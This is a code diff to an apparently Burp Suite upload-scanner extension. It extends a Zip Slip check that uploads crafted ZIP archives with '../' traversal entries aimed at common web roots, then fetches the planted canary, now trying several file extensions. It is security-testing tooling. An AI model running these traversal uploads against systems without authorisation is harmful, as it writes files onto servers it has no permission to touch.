@@ -3806,10 +3806,12 @@ trailer <<
                     colab_tests.extend(self._send_collaborator(injector, burp_colab, zip_types, basename, "",
                                                                issue, replace=_make_zip))
 
-        # --- Phase 2: web-root canary — plant HTML file, then actively GET it ---
+        # --- Phase 2: web-root canary — plant a file, then actively GET it ---
         canary_tag = ''.join(random.sample(string.ascii_letters, 8))
-        canary_filename = "zipslip_" + canary_tag + ".html"
+        canary_base = "zipslip_" + canary_tag
         canary_content = "<html><body>UploadScannerZipSlipProof-{}</body></html>".format(canary_tag)
+        # Try multiple extensions in case the server blocks extraction of .html files
+        canary_exts = ['.html', '.txt', '.png', '.jpg']
 
         # Parse upload URL path so relative traversal maps to the correct GET URL.
         # e.g. upload at /app/uploads/ → depth 1 lands at /app/, depth 2 at /
@@ -3817,27 +3819,24 @@ trailer <<
         upload_path = self._helpers.analyzeRequest(brr).getUrl().getPath()
         path_parts = [p for p in upload_path.split('/') if p]  # ['app', 'uploads']
 
-        # (entry_path, get_url) pairs — get_url is where the canary appears in URL space
-        webroot_targets = []
+        # (entry_dir, get_dir) — directory prefixes; filename+ext appended in the inner loop
+        target_dirs = []
 
         # URL-aware relative targets: ../N levels up from the upload URL (max 3)
         for depth in range(1, min(len(path_parts) + 1, 4)):
-            entry_path = "../" * depth + canary_filename
-            if depth < len(path_parts):
-                get_url = "/" + "/".join(path_parts[:-depth]) + "/" + canary_filename
-            else:
-                get_url = "/" + canary_filename
-            webroot_targets.append((entry_path, get_url))
+            entry_prefix = "../" * depth
+            get_prefix = ("/" + "/".join(path_parts[:-depth]) + "/") if depth < len(path_parts) else "/"
+            target_dirs.append((entry_prefix, get_prefix))
 
-        # Absolute-path targets: traverse deep enough to reach common web roots,
-        # then the canary always lands at /<canary_filename> in URL space.
+        # Absolute-path targets: traverse deep enough to reach common web roots;
+        # the canary always lands at /<filename> in URL space.
         for depth in range(1, 6):
             prefix = "../" * depth
             for subpath in ("var/www/html/", "srv/www/", "usr/share/nginx/html/", "var/www/"):
-                webroot_targets.append((prefix + subpath + canary_filename, "/" + canary_filename))
+                target_dirs.append((prefix + subpath, "/"))
 
         name_web = "Zip Slip — web root file write confirmed"
-        detail_web = ("A crafted ZIP archive was uploaded with a traversal entry '{}' containing a canary HTML file. "
+        detail_web = ("A crafted ZIP archive was uploaded with a traversal entry '{}' containing a canary file. "
                       "The file was subsequently retrieved via GET {}, confirming that the server extracted the "
                       "archive without sanitising entry names and that the file landed in a web-accessible directory. "
                       "This proves arbitrary file write and likely leads to Remote Code Execution. "
@@ -3862,22 +3861,30 @@ trailer <<
             return None
 
         zip_web_types = [('', '.zip', ''), ('', '.zip', 'application/zip')]
-        for entry_path, get_url in webroot_targets:
-            arc = _traversal_zip(entry_path, canary_content)
-            tag = entry_path.replace("/", "").replace(".", "").replace("_", "")[-10:]
-            basename = self.FILE_START + "ZipSlipWeb" + tag
-            for prefix, ext, mime in zip_web_types:
-                req = injector.get_request(prefix + basename + ext, arc, content_type=mime)
-                if not req:
-                    continue
-                self._make_http_request(injector, req)
-            fetch_rr = _try_fetch_canary(get_url)
-            if fetch_rr:
-                detail = detail_web.format(entry_path, get_url)
-                issue = self._create_issue_template(injector.get_brr(), name_web, detail, "Certain", "High")
-                issue.httpMessagesPy = [fetch_rr]
-                self._add_scan_issue(issue)
+        found = False
+        for entry_dir, get_dir in target_dirs:
+            if found:
                 break
+            for ext in canary_exts:
+                canary_filename = canary_base + ext
+                entry_path = entry_dir + canary_filename
+                get_url = get_dir + canary_filename
+                arc = _traversal_zip(entry_path, canary_content)
+                ftag = entry_path.replace("/", "").replace(".", "").replace("_", "")[-10:]
+                basename = self.FILE_START + "ZipSlipWeb" + ftag
+                for prefix, zip_ext, mime in zip_web_types:
+                    req = injector.get_request(prefix + basename + zip_ext, arc, content_type=mime)
+                    if not req:
+                        continue
+                    self._make_http_request(injector, req)
+                fetch_rr = _try_fetch_canary(get_url)
+                if fetch_rr:
+                    detail = detail_web.format(entry_path, get_url)
+                    issue = self._create_issue_template(injector.get_brr(), name_web, detail, "Certain", "High")
+                    issue.httpMessagesPy = [fetch_rr]
+                    self._add_scan_issue(issue)
+                    found = True
+                    break
 
         return colab_tests
 
